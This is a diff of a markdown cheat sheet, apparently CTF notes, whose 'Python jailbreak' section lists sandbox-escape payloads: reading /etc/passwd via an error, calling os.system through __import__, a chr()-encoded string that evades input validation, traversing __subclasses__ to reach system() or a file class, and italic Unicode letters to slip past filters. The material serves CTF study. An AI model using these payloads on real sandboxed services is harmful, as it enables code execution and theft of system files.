@@ -21,36 +21,42 @@
 
 ## Python jailbreak
 
-- Error based
+- **Error based**
   
-  ```
+  ```python
   int(open('/etc/passwd', 'r').read())
   ?????(????)
   ```
 
-- python2 input **rce**
+- **python2 input rce**
   
-  ```
+  ```python
   __import__('os').system('/etc/passwd')
   ```
 
-- Escaping some validation
+- **Escaping some validation**
 
-```
+```python
 chr(105) + chr(110) + chr(116) + chr(40) + chr(111) + chr(112) + chr(101) + chr(110) + chr(40) + chr(39) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116) + chr(39) + chr(44) + chr(32) + chr(39) + chr(114) + chr(39) + chr(41) + chr(46) + chr(114) + chr(101) + chr(97) + chr(100) + chr(40) + chr(41) + chr(41)
 ```
 
-- `<class 'os._wrap_close'> is 132`
+- **Use subclasses** 
 
-```
-print("".__class__.__mro__[1].__subclasses__())
-"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['s' + 'ys' + 'tem']('ls -la')
-
-```
+  - `Use <class 'os._wrap_close'>`
+  ```python
+  print("".__class__.__mro__[1].__subclasses__())
+  "".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['s'+'ys'+'tem']('ls -la')
+  ```
+  
+  - `Use <type 'file'>`
+  ```python
+  print(().__class__.__bases__[0].__subclasses__())
+  print(().__class__.__bases__[0].__subclasses__()[-84]("fla"+"g.txt").read())
+  ```
 
 - Use [`italic`](https://lingojam.com/ItalicTextGenerator) font to bypass filter
 
-```
+```python
 𝘱𝘳𝘪𝘯𝘵(𝘧𝘭𝘢𝘨)
 ```
 
